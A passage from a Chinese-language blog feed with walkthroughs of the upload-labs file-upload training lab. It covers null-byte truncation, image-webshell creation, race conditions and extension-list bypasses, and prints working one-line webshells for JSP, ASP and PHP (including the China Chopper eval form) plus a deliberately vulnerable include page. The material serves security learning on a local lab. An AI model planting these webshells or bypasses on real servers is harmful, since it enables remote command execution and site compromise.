alt="在这里插入图片描述"><br>配置好后，上传webshell.jpg，抓包，添加<code>webshell.php%00</code></p><p><img src="http://img-blog.csdnimg.cn/20190809231037491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功<br><img src="http://img-blog.csdnimg.cn/20190809231148663.png" alt="在这里插入图片描述"></p><p><strong>Less-12</strong><br>和Less-11不同的是这次的<code>save_path</code>是通过<strong>post</strong>传进来的，我们还利用00截断，但这题需要在<strong>十六进制</strong>中进行修改，因为post不会像get对<code>%00</code>进行自动解码。<br>步骤：上传webshell.jpg 然后 <strong>send to repeater</strong><br><img src="http://img-blog.csdnimg.cn/20190811130122673.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>添加文件 <code>wenshell.php(空格)  </code><br><img src="http://img-blog.csdnimg.cn/20190811130316391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>空格的十六进制为<code>20</code>然后找到<code>20</code> 改为<code>00</code><br><img src="http://img-blog.csdnimg.cn/20190811130824433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后点击send 发包就好了<br><img src="http://img-blog.csdnimg.cn/20190811131019426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发包成功。</p><p><strong>Less-13</strong><br>PS：</p><blockquote><p>这关需要将服务器版本改到PHP5.3及以上才行，不然运行文件包含漏洞会报错</p></blockquote><p>查看源码：</p><pre><code>function getReailFileType($filename)&#123;    $file = fopen($filename, &quot;rb&quot;);    $bin = fread($file, 2); //只读2字节    fclose($file);    $strInfo = @unpack(&quot;C2chars&quot;, $bin);        $typeCode = intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);        $fileType = &#39;&#39;;        switch($typeCode)&#123;              case 255216:                        $fileType = &#39;jpg&#39;;            break;        case 13780:                        $fileType = &#39;png&#39;;            break;                case 7173:                        $fileType = &#39;gif&#39;;            break;        default:                        $fileType = &#39;unknown&#39;;        &#125;            return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;]))&#123;    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_type = getReailFileType($temp_file);    if($file_type == &#39;unknown&#39;)&#123;        $msg = &quot;文件未知，上传失败！&quot;;    &#125;else&#123;        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;&#125;</code></pre><p>发现主要是取上传文件的头两个字节判断文件类型，因此直接上传图片马即可；<br>图片制作方法：<code>copy 1.jpg /b + shell.php /a webshell.jpg </code>（图片一句话木马为：<code>&lt;?php phpinfo(); ?&gt;</code> ）<br>解释：参数/b指定以二进制格式复制、合并文件(图片),参数/a指定以ASCII格式复制、合并文件（php文件）<br><img src="http://img-blog.csdnimg.cn/20190811161026745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>制作成功<br><img src="http://img-blog.csdnimg.cn/20190811161038122.png" alt="在这里插入图片描述"><br>然后直接上传<br><img src="http://img-blog.csdnimg.cn/20190811215009440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功，得到文件名，如果是上传的是一句话木马就能连接菜刀了；我们上传的是图片码，可以利用文件包含漏洞进行测试：<br>先新建一个包含文件漏洞的页面upload.php，将该文件放在根目录下：</p><pre><code>&lt;?php$file = $_GET[ &#39;page&#39; ];include($file);?&gt; </code></pre><p>测试使用，包含成功<br><code>http://127.0.0.1/upload-labs-master/upload/include.php?page=文件名</code><br><img src="http://img-blog.csdnimg.cn/20190812101341510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>另外有时候对文件大小也有限制，所以绕过文件幻数最合适的方式是利用16进制编辑器自己制作一个伪图片马，这里利用winhex创建shell.jpg伪图片马<br><img src="http://img-blog.csdnimg.cn/20190812144541935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Less-14</strong><br>查看关键代码：</p><pre><code>$types = &#39;.jpeg|.png|.gif&#39;;     if(file_exists($filename))&#123;        $info = getimagesize($filename);        $ext = image_type_to_extension($info[2]);1234</code></pre><p>这里用getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过，绕过方法同Less13 ，这里就不演示了<br>知识补充：</p><pre><code>array getimagesize ( string $filename [, array &amp;$imageinfo ] )getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。</code></pre><p><strong>Less-15</strong><br>关键源码：</p><pre><code>function isImage($filename)&#123;    //需要开启php_exif模块    $image_type = exif_imagetype($filename);    switch ($image_type) &#123;        case IMAGETYPE_GIF:            return &quot;gif&quot;;            break;        case IMAGETYPE_JPEG:            return &quot;jpg&quot;;            break;        case IMAGETYPE_PNG:            return &quot;png&quot;;            break;            default:            return false;            break;    &#125;&#125;</code></pre><p>利用<code>php_exif</code>模块判断文件类型，还是直接利用图片马就可以绕过。（查看下你的<code>php_exif</code>模块是否打开，没有的话就勾上）<br><img src="http://img-blog.csdnimg.cn/20190812103603762.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后直接上传图片马，仍和 less-13一样<br><img src="http://img-blog.csdnimg.cn/2019081214094798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传成功。</p><p><strong>Less-16</strong><br>查看源码：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;]))&#123;    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径    $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;];    $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);    // 获得上传文件的扩展名    $fileext= substr(strrchr($filename,&quot;.&quot;),1);    //判断文件后缀与类型，合法才进行上传操作    if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))&#123;            //使用上传的图片生成新的图片            $im = imagecreatefromjpeg($target_path);            if($im == false)&#123;                $msg = &quot;该文件不是jpg格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.jpg&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagejpeg($im,$img_path);                @unlink($target_path);                $is_upload = true;            &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))&#123;            //使用上传的图片生成新的图片            $im = imagecreatefrompng($target_path);            if($im == false)&#123;                $msg = &quot;该文件不是png格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                 //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.png&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagepng($im,$img_path);                @unlink($target_path);                $is_upload = true;                           &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;        if(move_uploaded_file($tmpname,$target_path))&#123;            //使用上传的图片生成新的图片            $im = imagecreatefromgif($target_path);            if($im == false)&#123;                $msg = &quot;该文件不是gif格式的图片！&quot;;                @unlink($target_path);            &#125;else&#123;                //给新图片指定文件名                srand(time());                $newfilename = strval(rand()).&quot;.gif&quot;;                //显示二次渲染后的图片（使用用户上传图片生成的新图片）                $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;                imagegif($im,$img_path);                @unlink($target_path);                $is_upload = true;            &#125;        &#125; else &#123;            $msg = &quot;上传出错！&quot;;        &#125;    &#125;else&#123;        $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;    &#125;&#125;</code></pre><p>通过源码可以看到对文件后缀名和<strong>MIME</strong>类型进行了检查，而且用到了php的<code>imagecreatefromjpeg</code>、<code>imagecreatefrompng</code>、<code>imagecreatefromgif</code>这几个图片处理函数对上传的图片进行了二次渲染生成了新的图片，所以如果在这里上传的是一个普通的图片马，虽然图片马可以上传成功，但是上传的图片马在经过二次渲染后，图片尾部的php代码就会被删除掉，所以在这里不能使用直接在图片尾部添加一句话木马的方式去合成图片马。但是这一关的代码有一个明显的逻辑漏洞，如果这几个二次渲染函数处理的不是一个图片，就会使这几个函数报错，因为这几个二次渲染的函数只会去处理一个图片内部格式正确的图片，所以在这里只需要上传一个后缀名为<code>jpg、png、gif</code>的一句话木马，这样的话上传的一句话木马会绕过后缀名和<strong>MIME</strong>类型的检查，通过<code>move_uploaded_file</code>上传至服务器，但是遇到二次渲染时，由于上传的不是一个真正的图片，所以二次渲染函数在处理时会因为图片的内部格式报错，从而突破了对图片的二次渲染，这时候页面虽然会显示图片格式不允许，但是上传的一句话木马已经上传到了服务器</p><p>上传后缀名为<code>jpg、png、gif</code>之一的图片马，<img src="http://img-blog.csdnimg.cn/20190812144948969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到上传成功，但是我的并没有成功解析；<br><img src="http://img-blog.csdnimg.cn/20190812152128350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>wenHex打开发现并查找不到我们的木马<br><img src="http://img-blog.csdnimg.cn/20190812152339238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>无奈 翻翻大佬们的blog发现是在二次渲染的时候被替换了，至于解决办法请看这位大佬写的<a href="https://xz.aliyun.com/t/2657">点这</a>我就不再描述(●’◡’●)</p><p><strong>Less-17</strong><br>本关考察的是条件竞争，查看代码：</p><pre><code>$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;    if(move_uploaded_file($temp_file, $upload_file))&#123;        if(in_array($file_ext,$ext_arr))&#123;             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        &#125;else&#123;            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);        &#125;    &#125;else&#123;        $msg = &#39;上传出错！&#39;;    &#125;&#125;</code></pre><p>这题我是蒙蔽的，好在看了大佬的操作才后知道了些；这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。</p><ul><li><p><code>unlink()</code> 函数是用来删除文件的</p></li><li><p>什么是条件竞争：</p></li></ul><blockquote><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p></blockquote><ul><li>首先在burp中不断发送上传webshell的数据包：</li><li>然后不断在浏览器中访问，发现通过竞争可以访问到：</li></ul><p>具体的操作方法我也没掌握，等学习到了就补上</p><p><strong>Less-18</strong><br>本关需要上传图片马，查看代码</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;]))&#123;    require_once(&quot;./myupload.php&quot;);    $imgFileName =time();    $u = new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName);    $status_code = $u-&gt;upload(UPLOAD_PATH);    switch ($status_code) &#123;        case 1:            $is_upload = true;            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;            break;        case 2:            $msg = &#39;文件已经被上传，但没有重命名。&#39;;            break;         case -1:            $msg = &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;;            break;         case -2:            $msg = &#39;上传失败，上传目录不可写。&#39;;            break;         case -3:            $msg = &#39;上传失败，无法上传该类型文件。&#39;;            break;         case -4:            $msg = &#39;上传失败，上传的文件过大。&#39;;            break;         case -5:            $msg = &#39;上传失败，服务器已经存在相同名称文件。&#39;;            break;         case -6:            $msg = &#39;文件无法上传，文件不能复制到目标目录。&#39;;            break;              default:            $msg = &#39;未知错误！&#39;;            break;    &#125;&#125;//myupload.phpclass MyUpload&#123;..................   var $cls_arr_ext_accepted = array(      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );..................    /** upload()   **   ** Method to upload the file.   ** This is the only method to call outside the class.   ** @para String name of directory we upload to   ** @returns void  **/  function upload( $dir )&#123;        $ret = $this-&gt;isUploadedFile();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;setDir( $dir );    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;checkExtension();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;checkSize();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;    // if flag to check if the file exists is set to 1    if( $this-&gt;cls_file_exists == 1 )&#123;      $ret = $this-&gt;checkFileExists();      if( $ret != 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;    // if we are here, we are ready to move the file to destination    $ret = $this-&gt;move();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;    // check if we need to rename the file    if( $this-&gt;cls_rename_file == 1 )&#123;      $ret = $this-&gt;renameFile();      if( $ret != 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;    // if we are here, everything worked as planned :)    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );  &#125;.................. &#125;;</code></pre><p>本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，然后再 <code>$ret = $this-&gt;renameFile();</code>，进行了一次更改文件名；同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功。</p><p><strong>Less-19</strong><br>查看源码：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = $_POST[&#39;save_name&#39;];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);        if(!in_array($file_ext,$deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                 $is_upload = true;            &#125;else&#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125;else&#123;            $msg = &#39;禁止保存为该类型文件！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>分析，<code>move_uploaded_file()</code>函数中的<code>img_path</code>是由post参数<code>save_name</code>控制的，<br>因此可以在<code>save_name</code>利用00截断绕过：<br>首先上传一个图片马，后缀名改为php+jpg</p><p><img src="http://img-blog.csdnimg.cn/20190814132429106.png" alt="在这里插入图片描述"><br>然后再16进制中把加号的2b 改为 00 fordward发包就行了。然而我的burp不知道为啥发不了，唉<br><img src="http://img-blog.csdnimg.cn/20190814134136876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我又发现，这题可以直接加空格绕过<br><img src="http://img-blog.csdnimg.cn/20190814134830601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190814134822821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试成功。<br><img src="http://img-blog.csdnimg.cn/20190814131818623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>好了，到这暂时就结束了至于Less20，需要审计代码，目前自己还做不了。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 上传漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>上传漏洞 upload-labs 练习（一）</title>
      <link href="2019/08/08/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20upload-labs%20%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2019/08/08/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20upload-labs%20%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>Less 1—10 写的很详细！╰(￣ω￣ｏ)</p><p>这周学习下关于文件上传漏洞的知识（小白入门），使用的平台是 <strong>upload-labs-master</strong> 项目地址：<a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a><br><img src="http://img-blog.csdnimg.cn/20190804162846978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>先来介绍下文件上传漏洞<br><strong>一. 什么是文件上传漏洞</strong></p><blockquote><p>Web应用程序通常会有文件上传的功能, 例如在 BBS发布图片 , 在个人网站发布ZIP 压缩 包, 在办公平台发布DOC文件等 , 只要 Web应用程序允许上传文件, 就有可能存在文件上传漏洞</p></blockquote><p><strong>二.什么样的网站会有文件上传漏洞</strong></p><blockquote><p>大部分文件上传漏洞的产生是因为Web应用程序没有对上传文件的格式进行严格过滤 , 还有一部分是攻击者通过Web服务器的解析漏洞来突破Web应用程序的防护, 后面我们会讲 到一些常见的解析漏洞, 最后还有一些不常见的其他漏洞, 如 IIS PUT漏洞等 </p></blockquote><p><strong>三.文件上传漏洞的危害</strong></p><blockquote><p>上传漏洞与SQL注入或 XSS相比 , 其风险更大 , 如果 Web应用程序存在上传漏洞 , 攻击者甚至可以直接上传一个webshell到服务器上<br> <hr></p></blockquote><p>关于<strong>webshell</strong></p><blockquote><p>webshell是以asp、php、jsp等网页文件形式存在的一种命令执行环境，也称其为一种网页后门。一般说来，当Hacker入侵一个网站后，会把这些asp、php木马的后门文件放在该网站的web目录中，和正常的网页文件混杂，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后呢，他就可以利用web请求的方式，用asp或者php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。</p></blockquote><p><strong>webshell</strong>的分类</p><blockquote><p>1.根据文件大小分类：大马和小马(通常指的是一句话木马，能够使用菜刀这类工具去直接连接它)<br> 2.根据脚本名称分类：jsp、asp、aspx、php</p></blockquote><p>几种经典的<strong>webshell:</strong></p><p>1）jsp的简单的webshell:</p><pre><code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</code></pre><p>2）asp的简单的webshell:</p><pre><code>success!!!!&lt;%eval request(&quot;cmd&quot;)%&gt;</code></pre><p>3）php的简单的webshell:</p><ul><li><p> php经典一句话: <code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></p></li><li><p>中国菜刀：<code>&lt;?php @eval($_POST[&#39;自定义密码&#39;]);?&gt; 然后连接菜刀就能直接进服务器了</code></p><p>好了介绍完这些就开始做题吧(。・∀・)ノ,<hr></p></li></ul><p><strong>Less-1</strong><br><img src="http://img-blog.csdnimg.cn/2019080418580531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 先在本地新建一个webshell文件，然后上传webshell 发现失败<br><img src="http://img-blog.csdnimg.cn/20190804190905864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码发现是JS验证，只能上传<code>.jpg|.png|.gif</code>这三种文件格式<br><img src="http://img-blog.csdnimg.cn/20190804191122183.png" alt="在这里插入图片描述"><br>对于js验证有三种绕过方法：</p><ol><li><p>使用浏览器插件。删除检测文件后缀的JS代码，然后上传webshell</p></li><li><p>首先把webshell的后缀改成允许上传的.jpg|.png|.gif，绕过JS检测。再抓包把后缀名改成.php,即可上传webshell</p></li><li><p>在前端js判断函数中加上可以上传php文件,或者直接删去这一函数</p></li></ol><p>由于是第一题，这里就分别用两种方法绕过演示下  (*￣3￣)╭</p><p>先用第2种：<br>把webshell的后缀php改为png<br><img src="http://img-blog.csdnimg.cn/20190804215416297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后上传，抓包修改后缀为php， 然后forward发包<br><img src="http://img-blog.csdnimg.cn/20190804215259931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传文件url地址可以在这看到（蓝色选中部分），<br><img src="https://img-blog.csdnimg.cn/2019080422320517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>菜刀连接 地址：<code>http://127.0.0.1/upload-labs-master/upload/webshell.php</code><br><img src="http://img-blog.csdnimg.cn/20190804231308328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功（￣︶￣）↗　<br><img src="http://img-blog.csdnimg.cn/2019080422360040.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>来看看第三种绕过：</p><p>这时要先猜测判断文件后缀的代码是在前端还是后端，打开burp进行拦截，发现点击上传后，并没有进行发包。可知判断后缀的代码在前端，即用js代码判断的，打开浏览器的审查元素，找到文件上传的js代码<br><img src="http://img-blog.csdnimg.cn/20190804224609581.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到蓝色选中区有<code>checkFile()</code>函数，我们把它删除后再上传</p><p>然后同理在F12审查元素中找到路径，菜刀连接。</p><p>第一关结束！（提示：上传到upload文件夹的小马别忘删了，因为下面还要用）</p><p><strong>Less-2</strong></p><p>直接上传，失败，提示文件类型不正确<br><img src="http://img-blog.csdnimg.cn/20190805154127899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传图片发现可以成功<br><img src="http://img-blog.csdnimg.cn/20190805155600556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]                        if (move_uploaded_file($temp_file, $img_path)) &#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else &#123;            $msg = &#39;文件类型不正确，请重新上传！&#39;;        &#125;    &#125; else &#123;        $msg = 